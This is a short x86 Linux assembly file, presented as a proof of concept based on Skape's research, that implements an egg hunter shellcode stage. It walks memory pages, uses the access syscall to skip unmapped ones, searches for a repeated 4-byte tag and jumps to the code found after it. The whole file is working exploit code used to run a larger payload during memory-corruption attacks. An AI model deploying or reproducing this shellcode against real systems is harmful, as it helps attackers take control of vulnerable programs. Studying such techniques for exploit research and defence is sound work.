;Author Dibyendu
;Proof of concept is based on Scape's reasearch paper

global _start

section .text


_start:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	mov ebx,0x41424142
	

_efault:
	or dx,0xfff

_valid:
	inc edx

_search:
	pusha
	lea ebx,[edx+0x4]
	mov al,0x21
	int 0x80

	cmp al,0xf2
	popa

	jz _efault
	cmp [edx],ebx
	jnz _valid
	cmp[edx+0x4],ebx
	jnz _valid
	jmp edx	

